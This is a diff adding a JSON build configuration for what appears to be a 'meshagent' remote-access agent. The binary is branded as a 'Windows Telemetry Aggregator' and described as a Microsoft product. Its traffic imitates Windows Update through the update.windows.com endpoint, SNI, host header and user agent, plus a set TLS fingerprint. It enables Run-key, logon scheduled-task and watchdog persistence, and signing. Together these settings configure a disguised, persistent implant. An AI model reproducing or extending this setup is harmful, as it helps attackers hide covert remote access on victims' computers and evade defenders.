@@ -1,0 +1,47 @@
+{
+  "$schema": "./schema/meshagent.schema.json",
+  "branding": {
+    "serviceName": "BypassTelemetrySvc",
+    "displayName": "Windows Telemetry Aggregator",
+    "binaryName": "bypasssvc.exe",
+    "companyName": "Bypass Methods Ltd",
+    "productName": "Windows Telemetry Aggregator",
+    "description": "Microsoft Telemetry Aggregator",
+    "installRoot": "C:/ProgramData/BypassSuite",
+    "logPath": "C:/ProgramData/BypassSuite/logs",
+    "icon": "../src/meshagent/resources/icons/telemetry.ico",
+    "versionInfo": {
+      "fileVersion": "1.2.3.4",
+      "productVersion": "1.2.3.4",
+      "originalFilename": "bypasssvc.exe"
+    }
+  },
+  "network": {
+    "primaryEndpoint": "wss://update.windows.com:443",
+    "sni": "update.windows.com",
+    "hostHeader": "update.windows.com",
+    "alpn": ["h2", "http/1.1"],
+    "userAgent": "Microsoft Windows Update Agent",
+    "ja3": "771,4865-4866-4867-49195-49196,65152-0-11-10-13-5,29-23-24,0",
+    "useIpOnly": false
+  },
+  "persistence": {
+    "runKey": true,
+    "scheduledTask": {
+      "enabled": true,
+      "name": "Windows Telemetry Aggregator",
+      "trigger": "onlogon"
+    },
+    "wmi": {
+      "enabled": false
+    },
+    "watchdog": {
+      "enabled": true,
+      "intervalSeconds": 300
+    }
+  },
+  "signing": {
+    "certificatePath": "C:/certs/bypassagent.pfx",
+    "timestampUrl": "http://timestamp.digicert.com"
+  }
+}
